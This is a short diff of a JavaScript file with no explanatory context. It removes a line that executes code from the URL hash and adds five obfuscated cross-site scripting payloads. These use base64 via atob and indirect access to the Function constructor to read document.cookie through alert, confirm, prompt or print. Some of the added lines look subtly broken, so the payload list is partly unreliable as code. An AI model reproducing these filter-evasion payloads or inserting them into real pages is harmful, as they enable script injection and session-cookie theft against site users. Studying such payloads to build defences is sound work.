@@ -1,1 +1,5 @@
-Function(decodeURIComponent(location.hash.slice(1)))()
+var a='YWxlcnQoZG9jdW1lbnQuY29va2llKQ==';Function(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))();
+Function(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))();
+isNaN['constr'+'uctor'](confirm(document.cookie))
+[].constructor(prompt(document.cookie));
+(1).toString['constructor'](print());
